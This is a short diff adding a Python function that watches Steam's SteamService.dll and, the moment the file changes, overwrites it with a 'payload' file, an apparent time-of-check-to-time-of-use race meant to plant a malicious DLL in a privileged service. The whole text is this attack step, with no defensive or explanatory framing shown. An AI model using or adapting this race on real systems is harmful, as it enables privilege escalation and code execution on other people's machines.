@@ -1,0 +1,13 @@
+def monitor_and_race():
+    """Monitor + TOCTOU race attempt."""
+    target = os.path.join(STEAM_DIR, "bin", "SteamService.dll")
+    # Monitoring loop with 50ms polling
+    prev_mtime = os.path.getmtime(target)
+    for _ in range(1200):  # 60 seconds
+        time.sleep(0.05)   # 50ms
+        mtime = os.path.getmtime(target)
+        if mtime != prev_mtime:
+            # File changed! Attempt substitution
+            shutil.copy2(payload, target)
+            break
+        prev_mtime = mtime
